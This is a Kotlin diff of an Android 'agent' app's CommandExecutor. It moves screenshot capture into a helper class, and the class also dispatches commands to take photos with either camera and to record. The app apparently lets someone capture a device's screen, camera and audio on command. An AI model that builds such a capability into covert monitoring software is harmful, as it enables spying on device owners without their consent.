@@ -1,20 +1,10 @@
 package org.hullas.agent
 
 import android.content.Context
-import android.graphics.Bitmap
-import android.graphics.PixelFormat
-import android.hardware.display.DisplayManager
-import android.hardware.display.VirtualDisplay
 import android.location.Location
 import android.media.MediaRecorder
-import android.media.projection.MediaProjection
 import android.os.Build
-import android.os.Environment
-import android.os.Handler
-import android.os.Looper
-import android.util.DisplayMetrics
 import android.util.Log
-import android.view.WindowManager
 import androidx.camera.core.CameraSelector
 import androidx.camera.core.ImageCapture
 import androidx.camera.core.ImageCaptureException
@@ -37,7 +27,7 @@ class CommandExecutor(private val ctx: Context) {
     suspend fun execute(cmd: Command): Result<File?> {
         return try {
             when (cmd.cmd) {
-                "screenshot" -> Result.success(takeScreenshot())
+                "screenshot" -> Result.success(ProjectionHelper.captureScreenshot(ctx))
                 "cam_back", "photo" -> Result.success(takePhoto(CameraSelector.LENS_FACING_BACK))
                 "cam_front" -> Result.success(takePhoto(CameraSelector.LENS_FACING_FRONT))
                 "record" -> {
@@ -50,48 +40,6 @@ class CommandExecutor(private val ctx: Context) {
         } catch (e: Exception) {
             Log.e(tag, "Execute xato: ${cmd.cmd}", e)
             Result.failure(e)
-        }
-    }
-
-    private fun takeScreenshot(): File? {
-        val projection = ScreenshotHolder.projection ?: return null
-        val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
-        val metrics = DisplayMetrics()
-        @Suppress("DEPRECATION")
-        wm.defaultDisplay.getRealMetrics(metrics)
-        val w = metrics.widthPixels
-        val h = metrics.heightPixels
-        val density = metrics.densityDpi
-
-        val reader = android.media.ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
-        var display: VirtualDisplay? = null
-        try {
-            display = projection.createVirtualDisplay(
-                "hullas_cap", w, h, density,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                reader.surface, null, null,
-            )
-            Thread.sleep(300)
-            val image = reader.acquireLatestImage() ?: return null
-            val planes = image.planes
-            val buffer = planes[0].buffer
-            val pixelStride = planes[0].pixelStride
-            val rowStride = planes[0].rowStride
-            val rowPadding = rowStride - pixelStride * w
-            val bmp = Bitmap.createBitmap(
-                w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888,
-            )
-            bmp.copyPixelsFromBuffer(buffer)
-            image.close()
-            val cropped = Bitmap.createBitmap(bmp, 0, 0, w, h)
-            val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
-            FileOutputStream(file).use { cropped.compress(Bitmap.CompressFormat.PNG, 90, it) }
-            bmp.recycle()
-            cropped.recycle()
-            return file
-        } finally {
-            display?.release()
-            reader.close()
         }
     }
 
